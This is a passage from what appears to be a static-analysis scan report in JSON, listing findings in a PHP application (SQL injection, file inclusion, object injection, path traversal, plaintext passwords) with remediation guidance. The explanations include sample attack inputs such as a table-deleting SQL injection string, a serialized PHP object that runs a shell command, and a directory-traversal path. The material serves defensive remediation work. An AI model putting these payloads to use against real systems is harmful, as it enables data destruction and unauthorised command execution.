            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4663/?engineType=SCA&issue=C6A74AE40C2D1C64029A751B1AF97F9C"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4482",
          "shortDescription" : {
            "text" : "Dangerous File Inclusion"
          },
          "fullDescription" : {
            "text" : "The file Factory.php passes an unvalidated filename to a dynamic include statement on line 76. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
          },
          "help" : {
            "text" : "Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.\n\n\nFile inclusion vulnerabilities are one of the most prolific and severe vulnerabilities in PHP applications. Prior to PHP 4.2.0, PHP installations shipped with the register_globals option enabled by default, which permits attackers to easily overwrite internal server variables. Although disabling register_globals can limit a program's exposure to file inclusion vulnerabilities, these problems still occur in modern PHP applications.\n\nExample 1: The following code includes a file under the application defined $server_root in a template.\n\n\n...\n&lt;?php include($server_root . '/myapp_header.php'); ?$gt;\n...\n\n\nIf register_globals is set to on, an attacker may overwrite the $server_root value by supplying $server_root as a request parameter, thereby taking partial-control of the dynamic include statement.\n\nExample 2: The following code takes a user specified template name and includes it in the PHP page to be rendered.\n\n\n...\n&lt;?php include($_GET['headername']); ?$gt;\n...\n\n\nIn Example 2, an attacker may take complete control of the dynamic include statement by supplying a malicious value for headername, which causes the program to include a file from an external site.\n\nIf the attacker specifies a valid file to a dynamic include statement, the contents of that file will be passed to the PHP interpreter. In the case of a plain text file, such as /etc/shadow, the file might be rendered as part of the HTML output. Worse, if the attacker may specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.\n\nDisable the register_globals option by including the following line in php.ini:\n\n\nregister_globals = 'off'\n\n\nDo not allow unvalidated user input to control paths used in dynamic include statements. Instead, use a level of indirection: create a list of legitimate files for inclusion, and only allow users to select from the list. With this approach, the user can not directly specify a file from the file system.\n\nExample 2 could be improved to map user input to a key that selects the desired template, as follows:\n\n\n&lt;?php\n\t$templates = array('main.php' =&gt; 1, 'blue.php' =&gt; 2, 'red.php' =&gt; 3);\n?$gt;\n...\n&lt;?php include($templates[$_GET['headername']]); ?$gt;\n\n...\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4482/?engineType=SCA&issue=52DE54E84169B8791741A6836207EC95"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4517",
          "shortDescription" : {
            "text" : "Password Management: Password in Configuration File"
          },
          "fullDescription" : {
            "text" : "Storing a plain text password in a configuration file may result in a system compromise.\n\n\n"
          },
          "help" : {
            "text" : "Storing a plain text password in a configuration file allows anyone who can read the file access to the password-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good password management guidelines require that a password never be stored in plain text.\n\n\nIn this case, a hardcoded password exists in Config.ini on line 63.\n\n\nA password should never be stored in plain text. An administrator should be required to enter the password when the system starts. If that approach is impractical, a less secure but often adequate solution is to obfuscate the password and scatter the de-obfuscation material around the system so that an attacker has to obtain and correctly combine multiple system resources to decipher the password.\n\nSome third-party products claim the ability to manage passwords in a more secure way. For example, WebSphere Application Server 4.x uses a simple XOR encryption algorithm for obfuscating values, but be skeptical about such facilities. WebSphere and other application servers offer outdated and relatively weak encryption mechanisms that are insufficient for security-sensitive environments. For a secure solution the only viable option is a proprietary one.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4517/?engineType=SCA&issue=61E2CE3F27075917E8A14C43D07B5CE3"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4518",
          "shortDescription" : {
            "text" : "Password Management: Password in Configuration File"
          },
          "fullDescription" : {
            "text" : "Storing a plain text password in a configuration file may result in a system compromise.\n\n\n"
          },
          "help" : {
            "text" : "Storing a plain text password in a configuration file allows anyone who can read the file access to the password-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good password management guidelines require that a password never be stored in plain text.\n\n\nIn this case, a hardcoded password exists in Config.ini on line 80.\n\n\nA password should never be stored in plain text. An administrator should be required to enter the password when the system starts. If that approach is impractical, a less secure but often adequate solution is to obfuscate the password and scatter the de-obfuscation material around the system so that an attacker has to obtain and correctly combine multiple system resources to decipher the password.\n\nSome third-party products claim the ability to manage passwords in a more secure way. For example, WebSphere Application Server 4.x uses a simple XOR encryption algorithm for obfuscating values, but be skeptical about such facilities. WebSphere and other application servers offer outdated and relatively weak encryption mechanisms that are insufficient for security-sensitive environments. For a secure solution the only viable option is a proprietary one.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4518/?engineType=SCA&issue=61E2CE3F27075917E8A14C43D07B5CE4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4367",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4367/?engineType=SCA&issue=025233C3C389FFADFDA0A962853E2FEB"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4478",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4478/?engineType=SCA&issue=500B9B1CA07DB1A9180679A5394A8A5F"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4486",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4486/?engineType=SCA&issue=565518B28F812D81537A8352998F3075"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4565",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4565/?engineType=SCA&issue=7D1FF7EFA69DA5A8E2CAA88F235A5B4C"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4661",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4661/?engineType=SCA&issue=C50F3FEE59C9612BA441F21FED597226"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4724",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4724/?engineType=SCA&issue=EAD43E46304550E7C4F835B8CA3A6601"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4741",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4741/?engineType=SCA&issue=F2637D8F1F192D678D54510DCF46220E"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4758",
          "shortDescription" : {
            "text" : "Object Injection"
          },
          "fullDescription" : {
            "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Object injection vulnerabilities occur when untrusted data is not properly sanitized before being passed to the unserialize() function. Attackers could pass specially crafted serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. The severity of this vulnerability depends on the classes available in the application scope. Classes implementing PHP magic method such as __wakeup or __destruct will be interesting for the attackers since they will be able to execute the code within these methods.\n\nExample 1: The following code shows a PHP class implementing the __destruct() magic method and executing a system command defined as a class property. There is also an insecure call to unserialize() with user-supplied data.\n\n\n...\nclass SomeAvailableClass {\n    public $command=null;\n    public function __destruct() {\n            system($this-&gt;command);\n    }\n}\n...\n$user = unserialize($_GET['user']);\n...\n\n\nIn Example 1, the application may be expecting a serialized User object but an attacker may actually provide a serialized version of SomeAvailableClass with a predefined value for its command property:\n\n\nGET REQUEST:  http://server/page.php?user=O:18:\"SomeAvailableClass\":1:{s:7:\"command\";s:8:\"uname -a\";}\n\n\nThe destructor method will be called as soon as there are no other references to the $user object and then it will execute the command provided by the attacker.\n\nAttackers may chain different classes declared when the vulnerable unserialize() is being called using a technique known as \"Property Oriented Programming\", which was introduced by Stefan Esser during BlackHat 2010 conference. This technique allows an attacker to reuse existing code to craft its own payload.\n\nDo not allow users to have direct control over the data unserialized by the program. In cases where user input must be serialized, use different serialization standard, such as JSON, instead.\n\nDo not rely on the lack of classes implementing dangerous magic methods to justify the usage of unserialize(), especially in modular applications that can be extended with plugins, since new classes could be loaded in different environments allowing the attackers to reuse the existing code to craft a malicious payload.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4758/?engineType=SCA&issue=FC6676C3207D671BFC4A83BA33B375A6"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4414",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at Storage.php line 305, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4414/?engineType=SCA&issue=2087A89E0F738A71E88A615F2141A6DB"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4662",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in Database.php on line 92.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4662/?engineType=SCA&issue=C63F1BA052CC1BD4D4A924A795C5C960"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4425",
          "shortDescription" : {
            "text" : "Password Management: Null Password"
          },
          "fullDescription" : {
            "text" : "Null passwords can compromise security.\n\n\n"
          },
          "help" : {
